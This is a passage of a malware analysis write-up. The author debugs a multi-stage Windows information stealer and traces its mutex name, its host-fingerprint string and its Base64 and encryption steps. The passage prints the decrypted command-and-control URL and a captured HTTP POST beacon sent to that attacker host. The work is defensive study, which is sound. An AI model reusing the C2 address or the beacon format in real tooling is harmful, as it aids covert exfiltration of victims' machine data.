	0019FCA0  006233D4  L"DESKTOP-SLQILPN"
	0019FCA4  006231C4  L"admin"
	0019FCA8  0062339C  L"Windows 10 Enterprise"
	0019FCAC  006271BC  L"3c0ac187-3c9e-4e13-a361-01c1dff207a7"
	
	0019FCB0  02470098  "DESKTOP-SLQILPN"
	0019FCB4  02470084  "admin"
	0019FCB8  02470060  "Windows 10 Enterprise"
	0019FCBC  0247002C  "3c0ac187-3c9e-4e13-a361-01c1dff207a7"
	0019FCC0  02470188  "D9FCF8FA9414907A16D0FCF2424BF0C460312720"

	
(I separated the above based on pointer offset value, as this is sometimes indicative of structs or related arguments pushed onto the stack.)

D9FCF8FA9414907A16D0FCF2424BF0C460312720 is later formatted to D9FCF8F-A9414907-A16D0FCF-2424BF0C-460312720 as CreateMutexA's lpName. I mention this to emphasize the importance of live analysis, as the automated Drltrace tool did not log CreateMutexA or the lpName value used. On a different note, mutex functions can be particularly useful for anti-malware software because they often establish if the malware has already been installed on the same machine. Sometimes, if mutex creation fails, the malware exits. D9FCF8F-A9414907-A16D0FCF-2424BF0C-460312720 is later encoded for internet use.

At 0x406e32, we see the following machine identifier string built:
	
	3c0ac187-3c9e-4e13-a361-01c1dff207a7Windows 10 EnterpriseadminDESKTOP-SLQILPN

	
Tracing further, we see a string decryption function that starts at 0x4069a8. Note: this 0x4069a8 function is statically called at three different offsets.

This string is produced:

	http://herg.us/index.php


By the way, the URL appears to be inaccessible, likely due to the hosting provider taking action. 

While debugging, I noticed the string ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/. That alphabet string is associated with the Base64 format. Relevant code examples are available at https://en.wikibooks.org/wiki/Algorithm_Implementation/Miscellaneous/Base64). We can place an access or read breakpoint on this string to possibly catch more Base64 string operations.

Eventually, a separate Linux VM running Wireshark shows just one HTTP request (associated with HttpSendRequestA):

	POST /index.php HTTP/1.1
	User-Agent: Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)
	Host: herg.us
	Content-Length: 105
	Cache-Control: no-cache

	JNí>3NLí>2(8L/û4/û9/û</û9/û4/û=/û:/úIKí>;í><(9øKI(8(9ú(9ü(9ú(9üOLí>:(8(9ü(9þ(9ø(9û(9ù(9ú(9ÿ(9ú(9ø

We could watch for further POST instances via a read or access breakpoint on POST at 0x4182ac.	
	
Debugging shows us the encrypted "JN" string above is based on the mutex and formed like so:

	D9FCF8F-A9414907-A16D0FCF-2424BF0C-460312720
		(Becomes...)
	D%39FCF%38F%2DA%39%34%31%34%39%30%37%2DA%31%36D%30FCF%2D%32%34%32%34BF%30C%2D%34%36%30%33%31%32%37%32%30
		(Becomes...)
	JNí>3NLí>2(8L/û4/û9/û</û9/û4/û=/û:/úIKí>;í><(9øKI(8(9ú(9ü(9ú(9üOLí>:(8(9ü(9þ(9ø(9û(9ù(9ú(9ÿ(9ú(9ø
	
Because of the server communication failure, the malware opts to discontinue further communication and soon terminates. Ideally, the server would still be in operation or we could try to emulate network traffic, patch the malware binary, etc.

Overall, 0x4186d3 is a great breakpoint starting place for each debugging session. From there, we can see all main operations performed in a logical sequence for stepping into/over.
	
I could go further with the analysis, but I think the above demonstrates my approach well enough, especially considering the malware server is inoperable. If you would like me to go further, please let me know. For example, I could report on more actions, disable anti-debug and use various checks to see what, if any, anti-debug is used, and for continued analysis, attempt to emulate the server or patch the binary.


--- Conclusion ---
	
This malware uses many evasion techniques. The first layer is written in .NET and it uses a Microsoft .NET utility (InstallUtil.exe) to launch itself as a service where it extracts a payload from memory. That payload (CyaX), also written in .NET, is executed, which performs multiple anti-analysis checks, establishes persistence, and from memory, decrypts and installs a theft-focused malware written in Delphi.
